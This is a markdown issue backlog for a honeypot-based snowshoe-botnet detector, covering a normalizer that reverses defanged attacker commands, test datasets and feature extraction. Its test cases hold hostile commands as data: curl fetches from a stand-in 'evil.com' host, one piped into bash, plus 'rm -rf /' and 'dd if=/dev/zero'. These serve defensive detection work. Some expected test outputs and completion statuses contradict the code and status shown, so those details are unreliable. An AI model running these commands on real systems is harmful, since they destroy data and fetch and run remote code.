# Snowshoe Botnet Detector Enhancement - GitHub Issue Tracking

## Project Overview

**Project**: Snowshoe Botnet Detector Enhancement  
**Phase**: 0 - Baseline & Defanging Review  
**Status**: 75% Complete - Critical Blockers Remaining  
**Purpose**: Comprehensive issue list for GitHub backlog creation  

## Issue Priority Levels

- **P0 - Critical Blocker**: Must complete before Phase 1 (Database Migration)
- **P1 - High Priority**: Should complete before Phase 2 (Core Enhancements)  
- **P2 - Medium Priority**: Complete before Phase 6 (Testing)
- **P3 - Low Priority**: Nice to have, can defer

## Critical Blockers (P0) - Required Before Phase 1

### Issue #1: Implement DefangingAwareNormalizer Class

**Priority**: P0 - Critical Blocker  
**Labels**: `phase-0`, `defanging`, `critical`, `implementation`  
**Estimated Effort**: 8 hours  
**Assignee**: TBD  
**Dependencies**: None  

**Description**:
Implement complete defanging normalization class to convert defanged commands back to semantic form for consistent vectorization. This is critical for command sequence analysis in Phase 2.2.

**Current State**:
- ✅ Defanging patterns documented (6 patterns identified)
- ✅ Test cases defined
- ❌ Implementation missing

**Acceptance Criteria**:
- [ ] `DefangingAwareNormalizer` class implemented in `cowrieprocessor/vectorization/defanging_normalizer.py`
- [ ] All 6 defanging patterns reversed correctly:
  - URL schemes (hxxp → http, hxxps → https, fxp → ftp)
  - Command names (bxsh → bash, cxrl → curl, rx → rm, dx → dd)
  - Operators ([AND] → &&, [OR] → ||, [PIPE] → |, [SC] → ;)
  - Subshell ([SUBSHELL] cmd [SUBSHELL] → $(cmd))
  - Backticks ([BACKTICK] cmd [BACKTICK] → `cmd`)
  - Risk level prefix removal ([defang:dangerous] → "")
- [ ] Normalization is idempotent (already-normalized commands pass through unchanged)
- [ ] Semantic normalization applied after defanging reversal (URLs → [URL], IPs → [IP], paths → [PATH:depth])
- [ ] Unit tests pass for all patterns
- [ ] Edge cases handled (nested patterns, multiple markers, unicode, empty strings)
- [ ] Documentation in docstrings

**Implementation Details**:
```python
# File: cowrieprocessor/vectorization/defanging_normalizer.py

import re
from typing import Optional

class DefangingAwareNormalizer:
    """
    Normalize defanged commands back to semantic form for vectorization.
    MUST be idempotent - handles both defanged and already-normalized commands.
    """
    
    # Reverse mapping from defanged to original
    DEFANG_REVERSE_MAP = {
        'hxxp://': 'http://',
        'hxxps://': 'https://',
        'fxp://': 'ftp://',
        'bxsh': 'bash',
        'cxrl': 'curl',
        'rx': 'rm',
        'dx': 'dd',
        '[AND]': '&&',
        '[OR]': '||',
        '[PIPE]': '|',
        '[SC]': ';',
    }
    
    def normalize_command(self, cmd: str) -> str:
        """
        Normalize defanged command to original semantic form.
        Idempotent - handles already-normalized commands safely.
        
        Args:
            cmd: Command string (may be defanged or already normalized)
            
        Returns:
            Normalized command string ready for vectorization
        """
        if not cmd or not cmd.strip():
            return ""
        
        # Remove risk level prefix
        cmd = self._remove_risk_prefix(cmd)
        
        # Replace defanged patterns with originals
        cmd = self._reverse_defanging(cmd)
        
        # Handle special patterns
        cmd = self._normalize_subshell(cmd)
        cmd = self._normalize_backticks(cmd)
        
        # Apply semantic normalization
        cmd = self._semantic_normalize(cmd)
        
        return cmd
    
    def _remove_risk_prefix(self, cmd: str) -> str:
        """Remove [defang:risk_level] prefix."""
        return re.sub(r'^\[defang:(dangerous|moderate|safe)\]\s*', '', cmd)
    
    def _reverse_defanging(self, cmd: str) -> str:
        """Replace defanged patterns with originals."""
        for defanged, original in self.DEFANG_REVERSE_MAP.items():
            cmd = cmd.replace(defanged, original)
        return cmd
    
    def _normalize_subshell(self, cmd: str) -> str:
        """Convert [SUBSHELL] cmd [SUBSHELL] → $(cmd)"""
        pattern = r'\[SUBSHELL\]\s*(.+?)\s*\[SUBSHELL\]'
        return re.sub(pattern, r'$(\1)', cmd)
    
    def _normalize_backticks(self, cmd: str) -> str:
        """Convert [BACKTICK] cmd [BACKTICK] → `cmd`"""
        pattern = r'\[BACKTICK\]\s*(.+?)\s*\[BACKTICK\]'
        return re.sub(pattern, r'`\1`', cmd)
    
    def _semantic_normalize(self, cmd: str) -> str:
        """
        Apply semantic normalization for vectorization.
        URLs → [URL], IPs → [IP], paths → [PATH:depth]
        """
        # Normalize URLs to pattern (after defanging reversal)
        url_pattern = r'(https?|ftp)://[^\s]+'
        cmd = re.sub(url_pattern, '[URL]', cmd)
        
        # Normalize IPs
        ip_pattern = r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
        cmd = re.sub(ip_pattern, '[IP]', cmd)
        
        # Normalize file paths to depth structure
        path_pattern = r'/[\w/]+'
        cmd = re.sub(path_pattern, lambda m: f"[PATH:{m.group().count('/')}]", cmd)
        
        return cmd.lower()  # Case-insensitive
```

**Sub-tasks**:
- [ ] Create `cowrieprocessor/vectorization/defanging_normalizer.py`
- [ ] Implement `DefangingAwareNormalizer` class with all methods
- [ ] Create unit tests in `tests/unit/test_defanging_normalizer.py`
- [ ] Test idempotency (normalized input → same output)
- [ ] Test edge cases (empty strings, unicode, nested patterns)
- [ ] Add docstrings and type hints
- [ ] Update Phase 0 document with implementation status

**Test Cases (must pass)**:
```python
test_cases = [
    ("cxrl hxxp://evil.com", "curl [URL]"),
    ("bxsh script.sh", "bash script.sh"),
    ("rx -rf /", "rm -rf [PATH:1]"),
    ("dx if=/dev/zero", "dd if=[PATH:2]"),
    ("cmd1 [AND] cmd2", "cmd1 && cmd2"),
    ("cmd1 [PIPE] cmd2", "cmd1 | cmd2"),
    ("[SUBSHELL] date [SUBSHELL]", "$(date)"),
    ("[BACKTICK] whoami [BACKTICK]", "`whoami`"),
    ("curl http://evil.com", "curl [URL]"),  # Idempotency test
    ("", ""),  # Empty string
    ("   ", ""),  # Whitespace only
]
```

---

### Issue #2: Document Defanging Edge Cases

**Priority**: P0 - Critical Blocker  
**Labels**: `phase-0`, `defanging`, `documentation`, `testing`  
**Estimated Effort**: 4 hours  
**Assignee**: TBD  
**Dependencies**: Issue #1 (DefangingAwareNormalizer)  

**Description**:
Document comprehensive edge cases for defanging normalization with test examples. Critical for ensuring robust command vectorization.

**Acceptance Criteria**:
- [ ] Minimum 10 edge cases documented in Phase 0 document
- [ ] Each edge case includes:
  - Input (defanged command)
  - Expected normalized output
  - Challenge description
  - Test assertion code
- [ ] All edge cases have passing tests
- [ ] Edge cases cover:
  - Multiple defanging markers in single command
  - Nested command substitution
  - Already-normalized commands (idempotency)
  - Partial defanging
  - Unicode characters
  - Empty/whitespace commands
  - Malformed defanging markers

**Edge Cases to Document**:

#### Edge Case 1: Multiple Defanging Markers in Single Command
**Input**: `cxrl hxxp://evil.com [PIPE] bxsh script.sh`  
**Expected**: `curl [URL] | bash script.sh`  
**Challenge**: Multiple patterns must be reversed in correct order  
**Test**:
```python
assert normalize("cxrl hxxp://evil.com [PIPE] bxsh script.sh") == "curl [URL] | bash script.sh"
```

#### Edge Case 2: Nested Command Substitution
**Input**: `echo [SUBSHELL] cxrl hxxp://192.168.1.1 [SUBSHELL]`  
**Expected**: `echo $(curl [URL])`  
**Challenge**: Nested patterns with multiple defanging types  
**Test**:
```python
assert normalize("echo [SUBSHELL] cxrl hxxp://192.168.1.1 [SUBSHELL]") == "echo $(curl [URL])"
```

#### Edge Case 3: Already Normalized Commands (Idempotency)
**Input**: `curl http://evil.com`  
**Expected**: `curl [URL]`  
**Challenge**: Must not break already-normalized commands  
**Test**:
```python
vec1 = vectorizer.transform([normalize("cxrl hxxp://evil.com")])
vec2 = vectorizer.transform([normalize("curl http://evil.com")])
assert np.array_equal(vec1, vec2)
```

**Sub-tasks**:
- [ ] Document all 10+ edge cases in Phase 0 document
- [ ] Create test fixtures for each edge case
- [ ] Implement tests in `tests/unit/test_defanging_edge_cases.py`
- [ ] Verify all tests pass
- [ ] Add edge case handling to normalization code if needed

---

### Issue #3: Execute Vocabulary Consistency Tests

**Priority**: P0 - Critical Blocker  
**Labels**: `phase-0`, `defanging`, `testing`, `validation`  
**Estimated Effort**: 6 hours  
**Assignee**: TBD  
**Dependencies**: Issue #1 (DefangingAwareNormalizer)  

**Description**:
Execute vocabulary consistency tests to verify that defanged and non-defanged commands produce identical vectors after normalization. Critical validation for Phase 2.2.

**Acceptance Criteria**:
- [ ] All 9 test cases from Phase 0 document executed
- [ ] Test results documented in Phase 0 document
- [ ] 100% pass rate achieved
- [ ] Test failures (if any) root-caused and fixed
- [ ] Test execution automated in test suite
- [ ] Performance measured (vectorization time per command)

**Test Framework**:
```python
# File: tests/unit/test_vocabulary_consistency.py

import numpy as np
from cowrieprocessor.vectorization.defanging_normalizer import DefangingAwareNormalizer
from cowrieprocessor.vectorization.command_vectorizer import CommandVectorizer

def test_vocabulary_consistency():
    """Test that defanged and normalized commands produce identical vectors."""
    
    normalizer = DefangingAwareNormalizer()
    vectorizer = CommandVectorizer(max_features=1000, ngram_range=(1, 3))
    
    # Test cases from Phase 0 document
    test_cases = [
        {"original": "curl http://evil.com", "defanged": "cxrl hxxp://evil.com", "expected_equal": True},
        {"original": "bash script.sh", "defanged": "bxsh script.sh", "expected_equal": True},
        {"original": "rm -rf /", "defanged": "rx -rf /", "expected_equal": True},
        {"original": "dd if=/dev/zero", "defanged": "dx if=/dev/zero", "expected_equal": True},
        {"original": "cmd1 && cmd2", "defanged": "cmd1 [AND] cmd2", "expected_equal": True},
        {"original": "cmd1 | cmd2", "defanged": "cmd1 [PIPE] cmd2", "expected_equal": True},
        {"original": "cmd1; cmd2", "defanged": "cmd1[SC] cmd2", "expected_equal": True},
        {"original": "$(curl http://evil.com)", "defanged": "[SUBSHELL] cxrl hxxp://evil.com [SUBSHELL]", "expected_equal": True},
        {"original": "echo `whoami`", "defanged": "echo [BACKTICK] whoami [BACKTICK]", "expected_equal": True},
    ]
    
    results = []
    for case in test_cases:
        # Normalize both versions
        norm_original = normalizer.normalize_command(case["original"])
        norm_defanged = normalizer.normalize_command(case["defanged"])
        
        # Fit vectorizer on both (for initial vocabulary)
        vectorizer.fit([norm_original, norm_defanged])
        
        # Transform to vectors
        vec_original = vectorizer.transform([norm_original])
        vec_defanged = vectorizer.transform([norm_defanged])
        
        # Check equality
        vectors_equal = np.array_equal(vec_original.toarray(), vec_defanged.toarray())
        
        result = {
            'original': case['original'],
            'defanged': case['defanged'],
            'norm_original': norm_original,
            'norm_defanged': norm_defanged,
            'expected_equal': case['expected_equal'],
            'actual_equal': vectors_equal,
            'passed': vectors_equal == case['expected_equal']
        }
        results.append(result)
        
        if case['expected_equal']:
            assert vectors_equal, f"FAILED: {case['original']} != {case['defanged']}"
            print(f"✓ {case['original']} ≈ {case['defanged']}")
        else:
            assert not vectors_equal, f"UNEXPECTED MATCH: {case['original']} == {case['defanged']}"
            print(f"✓ {case['original']} ≠ {case['defanged']} (as expected)")
    
    # Generate test report
    passed = sum(1 for r in results if r['passed'])
    total = len(results)
    
    print(f"\nVocabulary Consistency Test Results: {passed}/{total} passed ({passed/total*100:.1f}%)")
    
    return results
```

**Sub-tasks**:
- [ ] Implement test framework in `tests/unit/test_vocabulary_consistency.py`
- [ ] Execute tests on all 9 cases
- [ ] Document results in Phase 0 document
- [ ] Fix any failures (update normalizer or vectorizer)
- [ ] Measure and document performance
- [ ] Add to CI/CD pipeline

---

### Issue #4: Create Minimum Viable Test Dataset

**Priority**: P0 - Critical Blocker  
**Labels**: `phase-0`, `testing`, `dataset`, `labeling`  
**Estimated Effort**: 16 hours  
**Assignee**: TBD  
**Dependencies**: None  

**Description**:
Create minimum viable test dataset (20 labeled attack incidents) for baseline establishment and migration testing. Full dataset (100+ attacks) deferred to Phase 6.

**Acceptance Criteria**:
- [ ] 20 labeled attack incidents created in `tests/fixtures/snowshoe_baseline/`
- [ ] Distribution:
  - 5 credential stuffing attacks (50-150 IPs each)
  - 5 targeted attacks (10-30 IPs each)
  - 5 hybrid attacks (varied IP counts)
  - 5 legitimate traffic samples (should NOT cluster)
- [ ] Each incident has complete metadata JSON
- [ ] Incidents span different time periods (test vocabulary evolution)
- [ ] Edge cases included (single IP, no commands, empty passwords, IPv4/IPv6 mix)
- [ ] Metadata validated against schema
- [ ] Incidents extracted from real historical data where possible

**Dataset Structure**:
```
tests/fixtures/snowshoe_baseline/
├── credential_stuffing/
│   ├── attack_001_20240115.json
│   ├── attack_002_20240223.json
│   ├── attack_003_20240418.json
│   ├── attack_004_20240627.json
│   ├── attack_005_20241008.json
│   └── metadata.json
├── targeted_attacks/
│   ├── attack_001_20240312.json
│   ├── attack_002_20240515.json
│   ├── attack_003_20240719.json
│   ├── attack_004_20240902.json
│   ├── attack_005_20241121.json
│   └── metadata.json
├── hybrid_attacks/
│   ├── attack_001_20240208.json
│   ├── attack_002_20240425.json
│   ├── attack_003_20240708.json
│   ├── attack_004_20240916.json
│   ├── attack_005_20241204.json
│   └── metadata.json
├── legitimate_traffic/
│   ├── traffic_001_researcher.json
│   ├── traffic_002_security_scan.json
│   ├── traffic_003_automated_test.json
│   ├── traffic_004_single_user.json
│   ├── traffic_005_monitoring.json
│   └── metadata.json
└── edge_cases/
    ├── single_ip_20240601.json
    ├── no_commands_20240715.json
    ├── empty_passwords_20240820.json
    ├── mixed_ipv4_ipv6_20240930.json  # Future: when IPv6 supported
    └── metadata.json
```

**Metadata Schema**:
```json
{
  "attack_id": "credential_stuffing_001_20240115",
  "attack_type": "credential_stuffing",
  "date": "2024-01-15",
  "expected_detection": true,
  "expected_classification": "credential_stuffing",
  "characteristics": {
    "unique_ips": 127,
    "total_sessions": 154,
    "time_span_hours": 2.5,
    "countries": ["CN", "US", "RU", "DE", "BR"],
    "breach_ratio": 0.87,
    "geographic_diversity": 0.78,
    "time_coordination": true,
    "command_similarity": "low",
    "avg_session_duration_seconds": 3.2,
    "password_attempts_per_ip": 1.2
  },
  "ground_truth": {
    "is_snowshoe": true,
    "confidence": "high",
    "labeler": "researcher_name",
    "labeling_date": "2025-01-13",
    "notes": "Clear credential stuffing pattern with breached password list and single-attempt IPs"
  },
  "source": {
    "database": "cowrie_prod",
    "date_range": "2024-01-15T14:30:00Z to 2024-01-15T17:00:00Z",
    "honeypots": ["hp01", "hp03", "hp05"]
  }
}
```

**Sub-tasks**:
- [ ] Query historical database for candidate attacks (20+ incidents)
- [ ] Manually review and label each incident
- [ ] Extract session data to JSON files
- [ ] Create metadata for each incident
- [ ] Validate metadata against schema
- [ ] Document labeling criteria and confidence
- [ ] Store in `tests/fixtures/snowshoe_baseline/`
- [ ] Create README explaining dataset

---

### Issue #5: Establish Baseline Metrics on MVP Dataset

**Priority**: P0 - Critical Blocker  
**Labels**: `phase-0`, `baseline`, `metrics`, `validation`  
**Estimated Effort**: 8 hours  
**Assignee**: TBD  
**Dependencies**: Issue #4 (MVP Test Dataset)  

**Description**:
Run current snowshoe detector on MVP test dataset and establish baseline metrics. Critical for measuring improvement after enhancements.

**Acceptance Criteria**:
- [ ] Baseline script created (`scripts/calculate_baseline_metrics.py`)
- [ ] Current detector executed on all 20 labeled incidents
- [ ] Metrics calculated:
  - True Positives (correctly detected snowshoe attacks)
  - False Positives (legitimate traffic flagged as attacks)
  - False Negatives (missed attacks)
  - Precision, Recall, F1 Score
- [ ] Results documented in Phase 0 document
- [ ] Common failure modes identified and documented
- [ ] Baseline comparison framework established

**Sub-tasks**:
- [ ] Create baseline script in `scripts/calculate_baseline_metrics.py`
- [ ] Execute on MVP dataset
- [ ] Calculate metrics
- [ ] Identify failure modes
- [ ] Document in Phase 0 document
- [ ] Create baseline report for future comparison

---

### Issue #6: Implement Dynamic Provider Classification from Enrichment

**Priority**: P0 - Critical Blocker  
**Labels**: `phase-0`, `features`, `enrichment`, `implementation`  
**Estimated Effort**: 12 hours  
**Assignee**: TBD  
**Dependencies**: None  

**Description**:
Implement dynamic provider classification (cloud/VPN/Tor) using existing enrichment data instead of hardcoded ASN mappings. Features 52-54 critical for behavioral vector.

**Acceptance Criteria**:
- [ ] `extract_provider_features()` function implemented
- [ ] Uses existing DShield and Spur enrichment data
- [ ] Cloud provider detection via ASN name keyword matching
- [ ] VPN provider detection via Spur data (if available)
- [ ] Tor exit detection via Spur data (if available)
- [ ] Handles missing/stale enrichment gracefully
- [ ] Returns confidence metadata (high/medium/low/none)
- [ ] Staleness tracking implemented (enrichment_date)
- [ ] Configuration added to `sensors.toml`
- [ ] IPv6 preparation (detection logic, not full implementation)
- [ ] Unit tests pass
- [ ] Tested on real enrichment data (5+ sessions per type)

**Sub-tasks**:
- [ ] Create `cowrieprocessor/features/provider_classification.py`
- [ ] Implement `ProviderClassifier` class
- [ ] Add configuration to `sensors.toml`
- [ ] Create unit tests
- [ ] Test on real enrichment data (all types)
- [ ] Document in Phase 0 research
- [ ] Update feature extraction to use classifier

---

### Issue #7: Complete Feature Aggregation Helper Functions

**Priority**: P0 - Critical Blocker  
**Labels**: `phase-0`, `features`, `implementation`  
**Estimated Effort**: 6 hours  
**Assignee**: TBD  
**Dependencies**: Issue #6 (Provider Classification)  

**Description**:
Implement missing helper functions for multi-IP feature aggregation, particularly `calculate_geographic_spread()` and related geo functions.

**Acceptance Criteria**:
- [ ] `calculate_geographic_spread()` implemented with Haversine formula
- [ ] `calculate_entropy()` implemented (already documented, ensure complete)
- [ ] `aggregate_features()` fully functional with all helper functions
- [ ] Tested on real multi-IP attack data
- [ ] Unit tests pass
- [ ] Documentation complete

**Sub-tasks**:
- [ ] Create `cowrieprocessor/features/aggregation.py`
- [ ] Implement all helper functions
- [ ] Create unit tests for each function
- [ ] Test on real multi-IP attack data
- [ ] Document in Phase 0 research
- [ ] Update feature extraction to use aggregation

---

## High Priority (P1) - Before Phase 2

### Issue #8: Test Feature Extraction on 50+ Sessions

**Priority**: P1 - High Priority  
**Labels**: `phase-0`, `features`, `testing`, `validation`  
**Estimated Effort**: 6 hours  
**Assignee**: TBD  
**Dependencies**: Issue #6 (Provider Classification), Issue #7 (Aggregation)  

**Description**:
Test feature extraction on 50+ real sessions covering all edge cases to validate robustness.

**Acceptance Criteria**:
- [ ] Test on minimum 50 sessions from real database
- [ ] Sessions include edge cases:
  - Sessions with no commands
  - Sessions with many commands (>100)
  - Sessions with no password data
  - Sessions with incomplete enrichment
  - Sessions spanning multiple days
  - Single-IP sessions
  - Multi-IP clusters (10+ IPs)
- [ ] 100% extraction success rate on valid sessions
- [ ] Graceful handling of missing data
- [ ] Feature vector validation passes for all extractions
- [ ] Performance measured (time per session)
- [ ] Results documented in Phase 0 document

**Sub-tasks**:
- [ ] Implement test script
- [ ] Execute on 50+ real sessions
- [ ] Document results in Phase 0 document
- [ ] Fix any extraction failures
- [ ] Update feature extraction code if needed

---

### Issue #9: Run Feature Independence Analysis

**Priority**: P1 - High Priority  
**Labels**: `phase-0`, `features`, `validation`, `analysis`  
**Estimated Effort**: 6 hours  
**Assignee**: TBD  
**Dependencies**: Issue #8 (Feature Extraction Testing)  

**Description**:
Analyze correlation between features to identify and document redundancies. Remove features with very high correlation (r > 0.95).

**Acceptance Criteria**:
- [ ] Correlation analysis script implemented
- [ ] Executed on 100+ extracted feature vectors
- [ ] Correlation matrix generated and visualized
- [ ] High correlation pairs identified (|r| > 0.90)
- [ ] Expected correlations documented
- [ ] Unexpected high correlations investigated
- [ ] Decision made on feature removal (if r > 0.95)
- [ ] Results documented in Phase 0 document

**Sub-tasks**:
- [ ] Implement analysis script
- [ ] Extract features from 100+ sessions
- [ ] Run correlation analysis
- [ ] Generate visualization
- [ ] Document expected vs unexpected correlations
- [ ] Decide on feature removal (if any)
- [ ] Update feature specification if features removed

---

### Issue #10: Implement Batch Size Auto-Calculation

**Priority**: P1 - High Priority  
**Labels**: `phase-0`, `configuration`, `implementation`  
**Estimated Effort**: 3 hours  
**Assignee**: TBD  
**Dependencies**: None  

**Description**:
Implement batch size auto-calculation function for memory-aware processing.

**Acceptance Criteria**:
- [ ] `calculate_batch_size()` function implemented
- [ ] Uses configurable memory limit
- [ ] Enforces reasonable min/max bounds
- [ ] Documented in Phase 0 research
- [ ] Unit tests pass
- [ ] Configuration comment updated

**Sub-tasks**:
- [ ] Create `cowrieprocessor/utils/memory.py`
- [ ] Implement auto-calculation function
- [ ] Add to configuration loading
- [ ] Create unit tests
- [ ] Update `sensors.toml` comment
- [ ] Document in Phase 0 research

---

## Medium Priority (P2) - Before Phase 6

### Issue #11: Create Complete Test Dataset (100+ Incidents)

**Priority**: P2 - Medium Priority  
**Labels**: `phase-0`, `testing`, `dataset`, `labeling`  
**Estimated Effort**: 40 hours  
**Assignee**: TBD  
**Dependencies**: Issue #4 (MVP Dataset)  

**Description**:
Expand MVP test dataset to full 100+ labeled attack incidents for comprehensive validation in Phase 6.

**Acceptance Criteria**:
- [ ] 100+ labeled attack incidents
- [ ] Distribution:
  - 30+ credential stuffing attacks
  - 30+ targeted attacks
  - 20+ hybrid attacks
  - 20+ legitimate traffic samples
  - 20+ edge cases
- [ ] All incidents have complete metadata
- [ ] Multiple reviewers validated labels
- [ ] Dataset covers full year (temporal diversity)
- [ ] Dataset represents realistic attack distribution

**Sub-tasks**:
- [ ] Extract additional 80 incidents from historical data
- [ ] Manual labeling by multiple reviewers
- [ ] Create metadata for each incident
- [ ] Validate all metadata
- [ ] Document labeling criteria
- [ ] Store in test fixtures
- [ ] Update baseline with full dataset

---

### Issue #12: Establish Complete Baseline Metrics

**Priority**: P2 - Medium Priority  
**Labels**: `phase-0`, `baseline`, `metrics`  
**Estimated Effort**: 8 hours  
**Assignee**: TBD  
**Dependencies**: Issue #11 (Complete Dataset)  

**Description**:
Run baseline on complete test dataset for comprehensive performance measurement.

**Acceptance Criteria**:
- [ ] Baseline executed on 100+ incidents
- [ ] All metrics calculated
- [ ] Failure modes thoroughly analyzed
- [ ] Category-specific performance documented
- [ ] Results compared to MVP baseline
- [ ] Full baseline report created

**Sub-tasks**:
- [ ] Execute baseline script on full dataset
- [ ] Calculate comprehensive metrics
- [ ] Analyze failure modes by category
- [ ] Document in Phase 0 document
- [ ] Create detailed baseline report

---

## Documentation & Tracking

### Issue Workflow

1. Create GitHub issues from this document
2. Assign priority labels (P0, P1, P2, P3)
3. Add to Phase 0 milestone
4. Create sub-tasks as needed
5. Track completion in Phase 0 checklist

### Phase 0 Completion Gate

Before proceeding to Phase 1, all P0 issues must be complete:

- ✅ Issue #1: DefangingAwareNormalizer
- ✅ Issue #2: Defanging Edge Cases
- ✅ Issue #3: Vocabulary Consistency Tests
- ✅ Issue #4: MVP Test Dataset
- ✅ Issue #5: Baseline Metrics
- ✅ Issue #6: Provider Classification
- ✅ Issue #7: Aggregation Functions

**Phase 1 can proceed once all P0 issues are closed.**

### Summary Statistics

- **Total Issues**: 12
- **Critical Blockers (P0)**: 7
- **High Priority (P1)**: 3
- **Medium Priority (P2)**: 2
- **Estimated Total Effort**: ~117 hours

### Critical Path

- Issues #1 → #2 → #3 (defanging) must complete before Phase 2.2
- Parallel Work: Issues #4, #5 (dataset/baseline) can proceed alongside defanging work
- Dependencies: Issue #7 depends on #6, Issue #8 depends on #6 and #7

### Notes for GitHub Issue Creation

When creating GitHub issues:

1. Use issue titles exactly as shown (e.g., "Implement DefangingAwareNormalizer Class")
2. Copy full description, acceptance criteria, and implementation details
3. Create sub-tasks as checkboxes in issue body
4. Apply labels: `phase-0`, specific area labels, priority label
5. Link dependencies in issue body
6. Assign to Phase 0 milestone
7. Add estimated effort to issue

### Issue Template

```markdown
**Priority**: [P0/P1/P2]
**Estimated Effort**: [hours]
**Dependencies**: [Issue numbers or "None"]

[Description from this document]

**Acceptance Criteria**:
- [ ] Criterion 1
- [ ] Criterion 2
...

**Sub-tasks**:
- [ ] Sub-task 1
- [ ] Sub-task 2
...

[Implementation details from this document]
```

### Milestone Structure

**Phase 0 Milestone**: "Snowshoe Enhancement - Phase 0: Baseline & Defanging Review"
- Due Date: [Set based on team capacity]
- Description: Complete critical blockers for Phase 1 readiness
- Issues: All P0 issues (#1-#7)

**Phase 1 Milestone**: "Snowshoe Enhancement - Phase 1: Database Schema Migration"
- Due Date: [After Phase 0 completion]
- Description: Database schema changes and migrations
- Issues: Schema migration issues (to be created)

**Phase 2 Milestone**: "Snowshoe Enhancement - Phase 2: Core Enhancements"
- Due Date: [After Phase 1 completion]
- Description: Memory management, defanging integration, feature extraction
- Issues: Core enhancement issues (to be created)

### Progress Tracking

Use GitHub Projects or similar to track:

1. **Backlog**: All issues not yet started
2. **In Progress**: Issues currently being worked on
3. **Review**: Issues completed, awaiting review
4. **Done**: Issues completed and merged

### Dependencies Graph

```
Issue #1 (DefangingAwareNormalizer)
    ↓
Issue #2 (Defanging Edge Cases)
    ↓
Issue #3 (Vocabulary Consistency Tests)
    ↓
Phase 2.2 (Command Sequence Analysis)

Issue #4 (MVP Test Dataset)
    ↓
Issue #5 (Baseline Metrics)

Issue #6 (Provider Classification)
    ↓
Issue #7 (Aggregation Functions)
    ↓
Issue #8 (Feature Extraction Testing)

Issue #8 (Feature Extraction Testing)
    ↓
Issue #9 (Feature Independence Analysis)
```

This comprehensive issue tracking document provides the foundation for managing this complex enhancement project with clear priorities, dependencies, and completion gates.
